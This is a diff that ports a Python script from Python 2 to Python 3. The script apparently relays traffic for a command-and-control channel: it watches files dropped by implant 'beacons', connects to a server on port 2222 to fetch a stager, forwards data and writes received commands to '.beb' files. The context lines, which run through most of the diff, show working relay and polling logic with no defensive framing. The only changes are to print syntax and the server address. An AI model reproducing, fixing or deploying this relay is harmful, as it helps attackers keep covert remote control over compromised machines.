@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import socket
 import sys
 import os
@@ -7,7 +7,7 @@ import struct
 
 def createSocket():
     d = {}
-    d['sock'] = socket.create_connection(('192.168.1.51', 2222))
+    d['sock'] = socket.create_connection(('127.0.0.1', 2222))
     d['state'] = 1  
     #sock.setblocking(1)
     return (d)
@@ -55,7 +55,7 @@ while(True):
       #print "processing %s [%s bytes]"%(ffile,fsize)
       if ffile in beacons and  fsize > 0:
         sock = beacons[ffile]['sock']
-        print "#%d"%fsize,
+        print("#%d"%fsize, end = '')
         sleep(1)
         f = open(ffile,'rb')
         chunk = f.read()
@@ -68,7 +68,7 @@ while(True):
         ret = recv_frame(sock)
         #discard all under 2 bytes
         if len(ret) > 1:
-          print "got %s bytes command"%len(ret)
+          print("got %s bytes command"%len(ret), end = '')
           f = open("%s.beb"%ffile[:-4], 'wb')
           f.write(ret)
           f.close()
@@ -77,12 +77,12 @@ while(True):
         beacons[ffile]['state'] = 2
         open(ffile, 'w').close()
       elif ffile not in beacons and fsize > 0:
-        print "N"
+        print("N")
         beacons[ffile] = createSocket()
         #we need a stager and socket
         ret = getStage(beacons[ffile]['sock'])
         if len(ret) > 0:    
-            print "got %s bytes command"%len(ret)
+            print("got %s bytes command"%len(ret))
             f = open(ffile,'rb')
             f = open("%s.beb"%ffile[:-4], 'wb')
             f.write(ret)
@@ -93,11 +93,11 @@ while(True):
         #print "ff niet"
         if beacons[ffile]['state'] == 2:
             #let's check for new commands waiting on socket just pump some in to get a response
-            print "0",
+            print("0", end = '')
             send_frame(beacons[ffile]['sock'],"\0")
             ret = recv_frame(beacons[ffile]['sock'])
             if len(ret) > 1:
-                print "got %s bytes command"%len(ret)
+                print("got %s bytes command"%len(ret))
                 f = open("%s.beb"%ffile[:-4], 'wb')
                 f.write(ret)
                 f.close()
@@ -111,7 +111,7 @@ while(True):
           break 
         except:
           break 
-      print ".",
+      print(".", end = '')
   sleep(1)
 
 
